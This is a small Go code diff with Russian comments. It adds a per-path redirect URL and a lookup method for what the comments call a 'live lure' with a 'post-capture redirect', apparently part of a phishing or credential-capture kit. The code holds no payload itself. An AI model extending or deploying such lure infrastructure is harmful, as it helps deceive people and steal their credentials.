@@ -24,6 +24,23 @@ type Smart struct {
 	Uses             int
 	BoundIP          string // "" = любой IP
 	RequireChallenge bool   // нужен cookie __fp_ok=1
+	RedirectURL      string // lure override для post-capture redirect
+}
+
+// RedirectFor возвращает redirect_url живой приманки ("" = нет).
+func (s *Store) RedirectFor(path string) string {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	if pid, ok := s.m[path]; ok && pid != "" {
+		return ""
+	}
+	if sm, ok := s.smart[path]; ok {
+		if !sm.ExpiresAt.IsZero() && time.Now().After(sm.ExpiresAt) {
+			return ""
+		}
+		return sm.RedirectURL
+	}
+	return ""
 }
 
 func New() *Store { return &Store{m: map[string]string{}, smart: map[string]*Smart{}} }
